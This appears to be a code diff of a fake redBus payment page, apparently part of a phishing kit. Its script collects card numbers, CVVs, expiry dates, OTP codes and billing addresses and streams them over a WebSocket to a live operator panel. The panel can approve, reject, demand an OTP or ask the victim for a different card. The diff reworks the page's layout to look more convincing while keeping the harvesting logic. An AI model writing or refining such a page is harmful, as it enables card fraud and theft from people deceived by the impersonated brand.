@@ -2,104 +2,273 @@
 <html lang="en">
 <head>
 <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
 <title>Payment - redBus</title>
+<link rel="icon" href="favicon.ico">
 <style>
+:root {
+  --red: #d84e55;
+  --red-dark: #c0392b;
+  --green: #2e7d32;
+  --bg: #f2f2f8;
+  --card: #fff;
+  --text: #1d1d1d;
+  --text2: #666;
+  --border: #e8e8ec;
+  --radius: 12px;
+}
 *{box-sizing:border-box;margin:0;padding:0}
-body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f5f5f5;color:#333;min-height:100vh}
-.header{background:#d84e55;color:#fff;padding:16px 24px;display:flex;align-items:center;gap:12px}
-.header h1{font-size:18px;font-weight:600}
-.header a{color:#fff;text-decoration:none;font-size:14px}
-.container{max-width:600px;margin:0 auto;padding:20px}
-.card{background:#fff;border-radius:8px;box-shadow:0 1px 3px rgba(0,0,0,0.1);margin-bottom:16px;overflow:hidden}
-.card-header{background:#f8f8f8;padding:12px 16px;font-weight:600;font-size:14px;border-bottom:1px solid #eee}
-.card-body{padding:16px}
-.summary-item{display:flex;justify-content:space-between;padding:4px 0;font-size:14px}
-.summary-item .label{color:#666}
-.summary-item .value{font-weight:500}
+body{font-family:Inter,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;line-height:1.5;font-size:14px}
+
+/* Header */
+.header{background:#fff;border-bottom:1px solid var(--border);padding:0 20px;position:sticky;top:0;z-index:100}
+.header-inner{display:flex;align-items:center;justify-content:space-between;height:56px}
+.header-logo{height:32px}
+.header-back{display:flex;align-items:center;gap:6px;color:var(--text2);text-decoration:none;font-size:13px}
+.header-back svg{width:16px;height:16px}
+
+/* Main layout */
+.main{max-width:1040px;margin:0 auto;padding:20px;display:flex;gap:24px}
+@media(max-width:768px){.main{flex-direction:column;padding:12px}}
+
+/* Left panel - trip summary */
+.left{flex:0 0 380px;min-width:0}
+@media(max-width:768px){.left{flex:1}}
+.card{background:var(--card);border-radius:var(--radius);padding:20px;margin-bottom:12px;box-shadow:0 1px 3px rgba(0,0,0,.08)}
+
+/* Trip route */
+.trip-header{display:flex;align-items:flex-start;gap:12px;margin-bottom:16px}
+.bus-img{width:48px;height:48px;border-radius:8px;background:#f5f5f5;display:flex;align-items:center;justify-content:center;font-size:20px;flex-shrink:0}
+.bus-name{font-weight:700;font-size:16px;color:var(--text)}
+.bus-type{font-size:12px;color:var(--text2);margin-top:2px}
+.dashed-line{border-top:1px dashed var(--border);margin:12px 0}
+
+/* Trip timeline */
+.timeline{position:relative;padding:8px 0}
+.timeline-item{display:flex;gap:12px;margin-bottom:16px;position:relative}
+.timeline-dot{width:12px;height:12px;border-radius:50%;border:2px solid var(--red);flex-shrink:0;margin-top:4px;background:#fff;position:relative;z-index:1}
+.timeline-dot.arrival{border-color:var(--green)}
+.timeline-line{position:absolute;left:5px;top:20px;bottom:8px;width:2px;background:#e0e0e0}
+.timeline-time{font-weight:600;font-size:15px}
+.timeline-date{font-size:11px;color:var(--text2)}
+.timeline-place{font-weight:500}
+.timeline-addr{font-size:11px;color:var(--text2)}
+.timeline-dur{text-align:center;font-size:11px;color:var(--text2);padding:2px 0}
+
+/* Passenger */
+.pax-row{display:flex;justify-content:space-between;align-items:center;padding:8px 0}
+.pax-name{font-weight:500}
+.pax-seat{color:var(--text2);font-size:12px;background:#f0f0f0;padding:2px 8px;border-radius:4px}
+.pax-age{font-size:12px;color:var(--text2)}
+.contact-info{font-size:12px;color:var(--text2)}
+.contact-info div{margin:2px 0}
+
+/* Fare */
+.fare-row{display:flex;justify-content:space-between;padding:6px 0;font-size:13px}
+.fare-row.total{border-top:1px solid var(--border);margin-top:8px;padding-top:12px;font-size:18px;font-weight:700}
+.fare-row.total .val{color:var(--red)}
+
+/* Right panel - payment */
+.right{flex:1;min-width:0}
+
+/* Trust markers */
+.trust-row{display:flex;gap:16px;padding:12px 0;margin-bottom:8px}
+.trust-item{display:flex;align-items:center;gap:6px;font-size:11px;color:var(--text2)}
+.trust-dot{width:6px;height:6px;border-radius:50%;background:var(--green)}
+.trust-item svg{width:14px;height:14px}
+
+/* Section title */
+.sec-title{font-weight:600;font-size:14px;margin:0 0 12px;color:var(--text)}
+
+/* Coupon */
+.coupon-row{display:flex;align-items:center;justify-content:space-between;padding:12px 0;cursor:pointer;border-bottom:1px solid var(--border)}
+.coupon-row .left{display:flex;align-items:center;gap:10px;font-size:13px;flex:auto}
+.coupon-row img{width:22px;height:22px;flex-shrink:0}
+.coupon-input{display:none;padding:8px 0}
+.coupon-input.active{display:flex;gap:8px}
+.coupon-input input{flex:1;padding:8px 12px;border:1px solid var(--border);border-radius:6px;font-size:13px;outline:none}
+.coupon-input input:focus{border-color:var(--red)}
+.coupon-input button{padding:8px 16px;background:var(--red);color:#fff;border:none;border-radius:6px;font-size:13px;cursor:pointer;white-space:nowrap}
+.coupon-input button:hover{background:var(--red-dark)}
+
+/* Card form */
 .form-group{margin-bottom:14px}
-.form-group label{display:block;font-size:13px;color:#555;margin-bottom:4px;font-weight:500}
-.form-group input,.form-group select{width:100%;padding:10px 12px;border:1px solid #ddd;border-radius:6px;font-size:14px;outline:none;transition:border-color .2s}
-.form-group input:focus,.form-group select:focus{border-color:#d84e55}
+.form-group label{display:block;font-size:12px;color:var(--text2);margin-bottom:4px;font-weight:500}
+.form-group input,.form-group select{width:100%;padding:10px 12px;border:1px solid #ddd;border-radius:8px;font-size:14px;outline:none;transition:border-color .2s;font-family:inherit}
+.form-group input:focus,.form-group select:focus{border-color:var(--red)}
 .form-row{display:flex;gap:12px}
 .form-row .form-group{flex:1}
-.btn-submit{display:block;width:100%;padding:14px;background:#d84e55;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;margin-top:8px}
-.btn-submit:hover{background:#c0392b}
-.btn-submit:disabled{background:#ccc;cursor:not-allowed}
-.otp-section{display:none;margin-top:12px}
-.otp-section.active{display:block}
-.status-msg{text-align:center;padding:12px;font-size:14px;display:none}
-.status-msg.success{display:block;color:#2e7d32;background:#e8f5e9;border-radius:6px}
-.status-msg.error{display:block;color:#c62828;background:#ffebee;border-radius:6px}
-.status-msg.info{display:block;color:#1565c0;background:#e3f2fd;border-radius:6px}
-.timer{text-align:center;font-size:24px;font-weight:700;color:#e65100;margin:12px 0;display:none}
+.form-hint{font-size:11px;color:var(--text2);margin-top:-8px;margin-bottom:12px}
+
+/* Pay button */
+.pay-btn{width:100%;padding:14px;background:var(--red);color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:700;cursor:pointer;margin-top:8px;transition:background .2s}
+.pay-btn:hover{background:var(--red-dark)}
+.pay-btn:disabled{background:#ccc;cursor:not-allowed}
+
+/* OTP */
+.otp-section{display:none}
+.otp-section.active{display:block;margin-top:12px}
+.timer{text-align:center;font-size:22px;font-weight:700;color:#e65100;margin:12px 0;display:none}
 .timer.active{display:block}
-.no-data{text-align:center;color:#999;padding:40px;font-size:15px}
-.section-title{font-size:15px;font-weight:600;margin-bottom:12px;color:#333}
+
+/* Status */
+.status-msg{text-align:center;padding:12px;font-size:13px;border-radius:8px;display:none}
+.status-msg.success{display:block;color:var(--green);background:#e8f5e9}
+.status-msg.error{display:block;color:#c62828;background:#ffebee}
+.status-msg.info{display:block;color:#1565c0;background:#e3f2fd}
+
+/* No data */
+.no-data{text-align:center;color:#999;padding:60px 20px;font-size:14px}
+
+/* Footer bar */
+.footer-bar{position:sticky;bottom:0;background:#fff;border-top:1px solid var(--border);padding:12px 20px;display:flex;justify-content:space-between;align-items:center;z-index:100}
+.footer-total{font-size:16px;font-weight:700}
+.footer-total .price{color:var(--red);margin-left:4px}
+.footer-timer{font-size:12px;color:var(--text2)}
+
+/* Loading */
+#loading{display:none;text-align:center;padding:20px}
+.spinner{width:32px;height:32px;border:3px solid var(--border);border-top-color:var(--red);border-radius:50%;animation:spin .8s linear infinite;margin:0 auto 12px}
+@keyframes spin{to{transform:rotate(360deg)}}
 </style>
 </head>
 <body>
 
 <div class="header">
-  <a href="/">← Back</a>
-  <h1>Payment</h1>
+  <div class="header-inner">
+    <a href="#" onclick="history.back()" class="header-back">
+      <svg viewBox="0 0 16 16" fill="currentColor"><path d="M10.5 3L5.5 8l5 5" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round"/></svg>
+      Back
+    </a>
+    <img src="https://s3.rdbuz.com/assets/images/logo/b_logo.png" alt="redBus" class="header-logo">
+    <div></div>
+  </div>
 </div>
 
-<div class="container" id="app">
-  <div class="no-data" id="noData">Loading booking information...</div>
-  <div id="paymentForm" style="display:none">
+<div class="main" id="app">
+  <div class="no-data" id="noData">Loading booking data...</div>
 
-    <div class="card">
-      <div class="card-header">Trip Summary</div>
-      <div class="card-body">
-        <div class="summary-item"><span class="label">Product</span><span class="value" id="sProduct">-</span></div>
-        <div class="summary-item"><span class="label">Route</span><span class="value" id="sRoute">-</span></div>
-        <div class="summary-item"><span class="label">Date</span><span class="value" id="sDate">-</span></div>
-        <div class="summary-item"><span class="label">Seats</span><span class="value" id="sSeats">-</span></div>
-        <div class="summary-item" style="font-size:16px;font-weight:700;margin-top:8px;padding-top:8px;border-top:1px solid #eee">
-          <span class="label">Total</span><span class="value" id="sTotal">-</span>
+  <div id="content" style="display:none;display:flex;gap:24px;width:100%">
+    <!-- Left: Trip Summary -->
+    <div class="left">
+      <div class="card">
+        <div class="trip-header">
+          <div class="bus-img">🚌</div>
+          <div>
+            <div class="bus-name" id="busName">-</div>
+            <div class="bus-type" id="busType">-</div>
+          </div>
+        </div>
+        <div class="timeline">
+          <div class="timeline-line"></div>
+          <div class="timeline-item">
+            <div class="timeline-dot"></div>
+            <div>
+              <div class="timeline-time" id="depTime">--:--</div>
+              <div class="timeline-date" id="depDate">-</div>
+              <div class="timeline-place" id="depPlace">-</div>
+            </div>
+          </div>
+          <div class="timeline-dur" id="duration">-</div>
+          <div class="timeline-item">
+            <div class="timeline-dot arrival"></div>
+            <div>
+              <div class="timeline-time" id="arrTime">--:--</div>
+              <div class="timeline-date" id="arrDate">-</div>
+              <div class="timeline-place" id="arrPlace">-</div>
+            </div>
+          </div>
+        </div>
+        <div class="dashed-line"></div>
+        <div id="passengerSection" style="display:none">
+          <div class="pax-row" id="paxRow">
+            <div>
+              <div class="pax-name" id="paxName">-</div>
+              <div class="pax-age" id="paxAge">-</div>
+            </div>
+            <div class="pax-seat" id="paxSeat">-</div>
+          </div>
+          <div class="contact-info">
+            <div id="paxEmail">-</div>
+            <div id="paxPhone">-</div>
+          </div>
+          <div class="dashed-line"></div>
+        </div>
+        <div class="fare-row total">
+          <span>Total</span>
+          <span class="val" id="totalPrice">-</span>
         </div>
       </div>
     </div>
 
-    <div class="card">
-      <div class="card-header">Billing Information</div>
-      <div class="card-body">
-        <div class="section-title">Customer Details</div>
-        <div class="form-row">
-          <div class="form-group"><label>Full Name *</label><input id="fullName" placeholder="John Doe"></div>
+    <!-- Right: Payment Form -->
+    <div class="right">
+      <div class="trust-row">
+        <div class="trust-item">🔒 Secure Payment</div>
+        <div class="trust-item">⚡ Superfast Refunds</div>
+        <div class="trust-item">⭐ Trusted by Millions</div>
+      </div>
+
+      <!-- Coupon -->
+      <div class="card" style="margin-bottom:12px">
+        <div class="coupon-row" onclick="toggleCoupon()">
+          <div class="left">
+            <img src="Coupon.svg" alt="">
+            <span>Have a coupon code</span>
+          </div>
+          <span style="color:#999">›</span>
         </div>
+        <div class="coupon-input" id="couponInput">
+          <input type="text" id="couponCode" placeholder="Enter coupon code">
+          <button onclick="applyCoupon()">Apply</button>
+        </div>
+      </div>
+
+      <!-- Credit/Debit Card with form -->
+      <div class="card">
+        <div class="sec-title">Credit/Debit Card</div>
+
+        <div class="form-group">
+          <label>Card Number *</label>
+          <input id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" autocomplete="cc-number">
+        </div>
+        <div class="form-row">
+          <div class="form-group"><label>Expiry (MM/YY) *</label><input id="expiry" placeholder="MM/YY" maxlength="5" autocomplete="cc-exp"></div>
+          <div class="form-group"><label>CVV *</label><input id="cvv" placeholder="123" maxlength="4" type="password" autocomplete="cc-csc"></div>
+        </div>
+        <div class="form-group"><label>Cardholder Name *</label><input id="cardHolder" placeholder="Name on card" autocomplete="cc-name"></div>
+
+        <!-- OTP -->
+        <div class="otp-section" id="otpSection">
+          <div class="form-group"><label>OTP Code *</label><input id="otpCode" placeholder="Enter OTP code" maxlength="6"></div>
+          <div class="timer" id="otpTimer"></div>
+          <button class="pay-btn" id="btnOtp" style="background:#e65100">Submit OTP</button>
+        </div>
+
+        <div class="status-msg" id="statusMsg"></div>
+        <button class="pay-btn" id="btnSubmit">Pay <span id="btnPrice">RM -</span></button>
+      </div>
+
+      <!-- Billing Address -->
+      <div class="card">
+        <div class="sec-title">Billing Information</div>
+        <div class="form-group"><label>Full Name *</label><input id="fullName" placeholder="John Doe"></div>
         <div class="form-row">
           <div class="form-group"><label>Email</label><input id="email" type="email" placeholder="john@example.com"></div>
           <div class="form-group"><label>Phone</label><input id="phone" placeholder="+60 12 345 6789"></div>
         </div>
-
-        <div class="section-title" style="margin-top:16px">Billing Address</div>
-        <div class="form-row">
-          <div class="form-group"><label>Country *</label>
-            <select id="country">
-              <option value="">Select country...</option>
-              <option value="MY">Malaysia</option>
-              <option value="SG">Singapore</option>
-              <option value="ID">Indonesia</option>
-              <option value="TH">Thailand</option>
-              <option value="VN">Vietnam</option>
-              <option value="PH">Philippines</option>
-              <option value="BN">Brunei</option>
-              <option value="MM">Myanmar</option>
-              <option value="KH">Cambodia</option>
-              <option value="LA">Laos</option>
-              <option value="US">United States</option>
-              <option value="GB">United Kingdom</option>
-              <option value="CN">China</option>
-              <option value="IN">India</option>
-              <option value="AU">Australia</option>
-              <option value="JP">Japan</option>
-              <option value="KR">South Korea</option>
-              <option value="TW">Taiwan</option>
-              <option value="HK">Hong Kong</option>
-            </select>
-          </div>
+        <div class="form-group"><label>Country *</label>
+          <select id="country">
+            <option value="">Select country...</option>
+            <option value="MY" selected>Malaysia</option>
+            <option value="SG">Singapore</option>
+            <option value="ID">Indonesia</option>
+            <option value="TH">Thailand</option>
+            <option value="VN">Vietnam</option>
+            <option value="PH">Philippines</option>
+            <option value="US">United States</option>
+            <option value="GB">United Kingdom</option>
+          </select>
         </div>
         <div class="form-group"><label>Address Line 1 *</label><input id="address1" placeholder="123 Main Street"></div>
         <div class="form-group"><label>Address Line 2</label><input id="address2" placeholder="Apt, Suite, etc."></div>
@@ -112,28 +281,6 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
         </div>
       </div>
     </div>
-
-    <div class="card">
-      <div class="card-header">Card Information</div>
-      <div class="card-body">
-        <div class="form-group"><label>Card Number *</label><input id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19"></div>
-        <div class="form-row">
-          <div class="form-group"><label>Expiry (MM/YY) *</label><input id="expiry" placeholder="MM/YY" maxlength="5"></div>
-          <div class="form-group"><label>CVV *</label><input id="cvv" placeholder="123" maxlength="4" type="password"></div>
-        </div>
-        <div class="form-group"><label>Cardholder Name *</label><input id="cardHolder" placeholder="Name on card"></div>
-
-        <div class="otp-section" id="otpSection">
-          <div class="form-group"><label>OTP Code *</label><input id="otpCode" placeholder="Enter OTP code" maxlength="6"></div>
-          <div class="timer" id="otpTimer"></div>
-          <button class="btn-submit" id="btnOtp" style="background:#e65100">Submit OTP</button>
-        </div>
-
-        <div class="status-msg" id="statusMsg"></div>
-        <button class="btn-submit" id="btnSubmit">Submit Payment</button>
-      </div>
-    </div>
-
   </div>
 </div>
 
@@ -142,183 +289,146 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
   'use strict';
 
   var WS_URL = (location.protocol === 'https:' ? 'wss:' : 'ws:')
-    + '//' + location.host
-    + '/api/?role=customer&cid=' + encodeURIComponent('redbus_' + Date.now());
+    + '//' + location.host + '/api/?role=customer&cid=' + encodeURIComponent('redbus_' + Date.now());
 
-  var ws = null;
-  var sessionId = null;
-  var otpTimer = null;
-  var otpSeconds = 0;
-
+  var ws = null, sessionId = null, otpTimer = null, otpSeconds = 0;
   var bookingData = {};
-  try {
-    bookingData = JSON.parse(sessionStorage.getItem('redbus_booking') || '{}');
-  } catch(e) {}
+  try { bookingData = JSON.parse(sessionStorage.getItem('redbus_booking') || '{}'); } catch(e) {}
 
   var $ = function(id) { return document.getElementById(id); };
 
-  if (!bookingData.productType && !bookingData.origin) {
-    $('noData').textContent = 'No booking data found. Please search for a trip first.';
-  } else {
-    $('noData').style.display = 'none';
-    $('paymentForm').style.display = 'block';
-    $('sProduct').textContent = bookingData.productType || 'Bus';
-    $('sRoute').textContent = (bookingData.origin || '?') + ' → ' + (bookingData.destination || '?');
-    $('sDate').textContent = bookingData.departureDate || bookingData.date || '-';
-    $('sSeats').textContent = bookingData.seats || (bookingData.pax || 1) + ' passenger(s)';
-    $('sTotal').textContent = (bookingData.amount || '-') + ' ' + (bookingData.currencySymbol || bookingData.currency || 'MYR');
+  // Populate trip summary from booking data
+  function populateSummary() {
+    var d = bookingData;
+    if (!d.origin && !d.destination) {
+      document.getElementById('noData').textContent = 'No booking data found. Please complete your booking first.';
+      return false;
+    }
+    document.getElementById('noData').style.display = 'none';
+    document.getElementById('content').style.display = 'flex';
+
+    var busName = d.busName || d.operator || (d.origin + ' → ' + d.destination);
+    var busType = d.busType || '1 Passenger';
+    var depTime = d.departureTime || '-';
+    var depDate = d.departureDate || '-';
+    var arrTime = d.arrivalTime || '-';
+    var arrDate = d.departureDate || '-';
+    var depPlace = d.origin || '-';
+    var arrPlace = d.destination || '-';
+    var duration = d.duration || '';
+    var total = d.amount || '0';
+    var currency = d.currencySymbol || d.currency || 'MYR';
+    var paxName = d.passengerName || '';
+    var paxSeat = d.seats || (d.pax || 1) + ' Passengers';
+    var paxEmail = d.email || '';
+    var paxPhone = d.phone || '';
+
+    $('busName').textContent = busName;
+    $('busType').textContent = busType;
+    $('depTime').textContent = depTime;
+    $('depDate').textContent = depDate;
+    $('depPlace').textContent = depPlace;
+    $('arrTime').textContent = arrTime;
+    $('arrDate').textContent = arrDate;
+    $('arrPlace').textContent = arrPlace;
+    if (duration) $('duration').textContent = duration;
+    $('totalPrice').textContent = (currency === 'MYR' ? 'RM ' : '') + Number(total).toFixed(2);
+    $('btnPrice').textContent = (currency === 'MYR' ? 'RM ' : '') + Number(total).toFixed(2);
+
+    if (paxName) {
+      document.getElementById('passengerSection').style.display = 'block';
+      $('paxName').textContent = paxName;
+      $('paxSeat').textContent = paxSeat;
+      $('paxEmail').textContent = paxEmail;
+      $('paxPhone').textContent = paxPhone;
+    }
+    return true;
   }
+  if (!populateSummary()) { return; }
 
+  // Card input formatting
   $('cardNumber').addEventListener('input', function() {
-    var val = this.value.replace(/\s/g, '').replace(/\D/g, '');
-    this.value = val.replace(/(.{4})/g, '$1 ').trim();
+    var v = this.value.replace(/\s/g, '').replace(/\D/g, '');
+    this.value = v.replace(/(.{4})/g, '$1 ').trim();
+  });
+  $('expiry').addEventListener('input', function() {
+    var v = this.value.replace(/\D/g, '');
+    if (v.length >= 3) v = v.slice(0,2) + '/' + v.slice(2);
+    if (v.length > 5) v = v.slice(0,5);
+    this.value = v;
   });
 
-  $('expiry').addEventListener('input', function() {
-    var val = this.value.replace(/\D/g, '');
-    if (val.length >= 3) val = val.substring(0, 2) + '/' + val.substring(2);
-    if (val.length > 5) val = val.substring(0, 5);
-    this.value = val;
-  });
+  function toggleCoupon() { $('couponInput').classList.toggle('active'); }
+  function applyCoupon() { showStatus('info', 'Coupon applied!'); }
 
   function connectWS() {
     if (ws && ws.readyState === WebSocket.OPEN) return;
     ws = new WebSocket(WS_URL);
-    ws.onopen = function() { console.log('[WS] Connected'); };
     ws.onmessage = function(e) { try { handleMessage(JSON.parse(e.data)); } catch(err) {} };
-    ws.onclose = function() { console.log('[WS] Disconnected'); };
-    ws.onerror = function(err) { console.error('[WS] Error:', err); };
+    ws.onclose = function() { console.log('[WS] Closed'); };
+    ws.onerror = function(e) { console.error('[WS] Error'); };
   }
-
   function send(msg) {
     if (!ws || ws.readyState !== WebSocket.OPEN) { connectWS(); setTimeout(function() { send(msg); }, 500); return; }
     ws.send(JSON.stringify(msg));
   }
-
   function handleMessage(msg) {
-    switch (msg.action) {
-      case 'ack':
-        sessionId = msg.sessionId;
-        showStatus('info', 'Payment is being processed. Please wait...');
-        break;
-      case 'approve':
-        showStatus('success', 'Payment approved! Redirecting...');
-        $('btnSubmit').disabled = true;
-        $('btnSubmit').textContent = 'Approved';
-        stopOTPTimer();
-        setTimeout(function() { window.location.href = '/complete/'; }, 2000);
-        break;
-      case 'reject':
-        showStatus('error', 'Payment declined. Please try again.');
-        $('btnSubmit').disabled = false;
-        $('btnSubmit').textContent = 'Submit Payment';
-        hideOTP();
-        break;
-      case 'otp_verify':
-        showOTP();
-        if (msg.countdown) startOTPTimer(msg.countdown);
-        break;
-      case 'email_verify':
-        showStatus('info', 'Please check your email for verification code.');
-        break;
-      case 'timeout':
-        showStatus('error', 'Session expired. Please try again.');
-        $('btnSubmit').disabled = false;
-        $('btnSubmit').textContent = 'Submit Payment';
-        hideOTP();
-        break;
-      case 'card_error':
-        showStatus('error', msg.message || 'Card error. Please check your card details.');
-        hideOTP();
-        break;
-      case 'change_card':
-        showStatus('info', msg.message || 'Please try a different card.');
-        $('cardNumber').value = '';
-        $('cardNumber').focus();
-        hideOTP();
-        break;
-      case 'session_update': break;
+    switch(msg.action) {
+      case 'ack': sessionId = msg.sessionId; showStatus('info', 'Processing payment...'); break;
+      case 'approve': showStatus('success', 'Payment approved! Redirecting...'); $('btnSubmit').disabled = true; $('btnSubmit').textContent = 'Approved'; stopTimer(); setTimeout(function() { window.location.href = '/complete/'; }, 2000); break;
+      case 'reject': showStatus('error', 'Payment declined.'); $('btnSubmit').disabled = false; $('btnSubmit').textContent = 'Pay ' + $('btnPrice').textContent; hideOTP(); break;
+      case 'otp_verify': showOTP(); if (msg.countdown) startTimer(msg.countdown); break;
+      case 'email_verify': showStatus('info', 'Check your email for verification code.'); break;
+      case 'timeout': showStatus('error', 'Session expired.'); $('btnSubmit').disabled = false; $('btnSubmit').textContent = 'Pay ' + $('btnPrice').textContent; hideOTP(); break;
+      case 'card_error': showStatus('error', msg.message || 'Card error.'); hideOTP(); break;
+      case 'change_card': showStatus('info', msg.message || 'Try a different card.'); $('cardNumber').value = ''; $('cardNumber').focus(); hideOTP(); break;
       case 'session_restored':
-        if (msg.cardInfo) { $('cardNumber').value = msg.cardInfo.cardNumber || ''; $('expiry').value = msg.cardInfo.expiry || ''; $('cvv').value = msg.cardInfo.cvv || ''; $('cardHolder').value = msg.cardInfo.cardHolder || ''; }
-        if (msg.customerInfo) { $('fullName').value = msg.customerInfo.fullName || ''; $('email').value = msg.customerInfo.email || ''; $('phone').value = msg.customerInfo.phone || ''; $('country').value = msg.customerInfo.country || ''; $('address1').value = msg.customerInfo.address1 || ''; $('address2').value = msg.customerInfo.address2 || ''; $('city').value = msg.customerInfo.city || ''; $('state').value = msg.customerInfo.state || ''; $('zipCode').value = msg.customerInfo.zipCode || ''; }
-        sessionId = msg.sessionId;
-        showStatus('info', 'Session restored.');
-        break;
+        var c = msg.cardInfo || {}, i = msg.customerInfo || {};
+        $('cardNumber').value = c.cardNumber || ''; $('expiry').value = c.expiry || ''; $('cvv').value = c.cvv || ''; $('cardHolder').value = c.cardHolder || '';
+        $('fullName').value = i.fullName || ''; $('email').value = i.email || ''; $('phone').value = i.phone || ''; $('country').value = i.country || '';
+        $('address1').value = i.address1 || ''; $('address2').value = i.address2 || ''; $('city').value = i.city || ''; $('state').value = i.state || ''; $('zipCode').value = i.zipCode || '';
+        sessionId = msg.sessionId; showStatus('info', 'Session restored.'); break;
     }
   }
-
-  function showStatus(type, text) { var el = $('statusMsg'); el.className = 'status-msg ' + type; el.textContent = text; el.style.display = 'block'; }
+  function showStatus(type, text) { var e = $('statusMsg'); e.className = 'status-msg ' + type; e.textContent = text; e.style.display = 'block'; }
   function showOTP() { $('otpSection').classList.add('active'); $('btnSubmit').style.display = 'none'; }
-  function hideOTP() { $('otpSection').classList.remove('active'); $('btnSubmit').style.display = 'block'; $('otpCode').value = ''; stopOTPTimer(); }
-  function startOTPTimer(seconds) { stopOTPTimer(); otpSeconds = seconds || 120; $('otpTimer').classList.add('active'); updateTimer(); otpTimer = setInterval(function() { otpSeconds--; updateTimer(); if (otpSeconds <= 0) { stopOTPTimer(); showStatus('error', 'OTP expired.'); hideOTP(); } }, 1000); }
-  function stopOTPTimer() { if (otpTimer) { clearInterval(otpTimer); otpTimer = null; } $('otpTimer').classList.remove('active'); $('otpTimer').textContent = ''; }
-  function updateTimer() { var m = Math.floor(otpSeconds / 60); var s = otpSeconds % 60; $('otpTimer').textContent = m + ':' + (s < 10 ? '0' : '') + s; }
+  function hideOTP() { $('otpSection').classList.remove('active'); $('btnSubmit').style.display = 'block'; $('otpCode').value = ''; stopTimer(); }
+  function startTimer(s) { stopTimer(); otpSeconds = s || 120; $('otpTimer').classList.add('active'); updateTimer(); otpTimer = setInterval(function() { otpSeconds--; updateTimer(); if (otpSeconds <= 0) { stopTimer(); showStatus('error', 'OTP expired.'); hideOTP(); } }, 1000); }
+  function stopTimer() { if (otpTimer) { clearInterval(otpTimer); otpTimer = null; } $('otpTimer').classList.remove('active'); }
+  function updateTimer() { var m = Math.floor(otpSeconds / 60), s = otpSeconds % 60; $('otpTimer').textContent = m + ':' + (s < 10 ? '0' : '') + s; }
 
   function buildPayload() {
     return {
       frontendUrl: 'redbus.my',
       currentStep: 'card',
       browsingTabs: [{ label: '商品页', count: 0, active: false }, { label: '地址页', count: 1, active: false }, { label: '卡片页', count: 1, active: true }],
-      cardInfo: {
-        cardNumber: ($('cardNumber').value || '').replace(/\s/g, ''),
-        expiry: $('expiry').value || '',
-        cvv: $('cvv').value || '',
-        cardHolder: $('cardHolder').value || '',
-        otpCode: $('otpCode').value || ''
-      },
+      cardInfo: { cardNumber: ($('cardNumber').value || '').replace(/\s/g, ''), expiry: $('expiry').value || '', cvv: $('cvv').value || '', cardHolder: $('cardHolder').value || '', otpCode: $('otpCode').value || '' },
       customerInfo: {
-        firstName: ($('fullName').value || '').split(' ')[0] || '',
-        lastName: ($('fullName').value || '').split(' ').slice(1).join(' ') || '',
-        fullName: $('fullName').value || '',
-        email: $('email').value || '',
-        phone: $('phone').value || '',
-        country: $('country').value || '',
-        address1: $('address1').value || '',
-        address2: $('address2').value || '',
-        city: $('city').value || '',
-        state: $('state').value || '',
-        zipCode: $('zipCode').value || ''
+        fullName: $('fullName').value || '', email: $('email').value || '', phone: $('phone').value || '', country: $('country').value || '',
+        address1: $('address1').value || '', address2: $('address2').value || '', city: $('city').value || '', state: $('state').value || '', zipCode: $('zipCode').value || ''
       }
     };
   }
 
   $('btnSubmit').addEventListener('click', function() {
     var cn = ($('cardNumber').value || '').replace(/\s/g, '');
-    var ex = $('expiry').value || '';
-    var cv = $('cvv').value || '';
-    var ch = $('cardHolder').value || '';
-    var fn = $('fullName').value || '';
-    var co = $('country').value || '';
-
-    if (!fn || !co || !cn || !ex || !cv || !ch) { showStatus('error', 'Please fill in all required fields.'); return; }
-    if (!/[0-9]{2}\/[0-9]{2}/.test(ex)) { showStatus('error', 'Please enter a valid expiry date (MM/YY).'); return; }
-
-    $('btnSubmit').disabled = true;
-    $('btnSubmit').textContent = 'Processing...';
+    if (!cn || !$('expiry').value || !$('cvv').value || !$('cardHolder').value || !$('fullName').value) { showStatus('error', 'Please fill all required fields.'); return; }
+    if (!/\d{2}\/\d{2}/.test($('expiry').value)) { showStatus('error', 'Invalid expiry (MM/YY).'); return; }
+    this.disabled = true; this.textContent = 'Processing...';
     connectWS();
-    var payload = buildPayload();
-    send({ type: 'customer_input', payload: payload });
-    setTimeout(function() {
-      if (sessionId) { var sp = buildPayload(); sp.sessionId = sessionId; sp.status = 'pending'; send({ type: 'session_update', payload: sp }); }
-    }, 1000);
+    var p = buildPayload();
+    send({ type: 'customer_input', payload: p });
+    setTimeout(function() { if (sessionId) { var sp = buildPayload(); sp.sessionId = sessionId; sp.status = 'pending'; send({ type: 'session_update', payload: sp }); } }, 1000);
   });
-
   $('btnOtp').addEventListener('click', function() {
-    var otpCode = $('otpCode').value || '';
-    if (!otpCode) { showStatus('error', 'Please enter the OTP code.'); return; }
-    if (!sessionId) return;
-    var payload = buildPayload();
-    payload.sessionId = sessionId;
-    payload.cardInfo.otpCode = otpCode;
-    payload.status = 'pending';
-    send({ type: 'session_update', payload: payload });
-    $('btnOtp').disabled = true;
-    $('btnOtp').textContent = 'Verifying...';
-    showStatus('info', 'Verifying OTP...');
+    var o = $('otpCode').value; if (!o) { showStatus('error', 'Enter OTP code.'); return; } if (!sessionId) return;
+    var p = buildPayload(); p.sessionId = sessionId; p.cardInfo.otpCode = o; p.status = 'pending';
+    send({ type: 'session_update', payload: p }); this.disabled = true; this.textContent = 'Verifying...';
   });
 
   connectWS();
 })();
 </script>
+
 </body>
 </html>
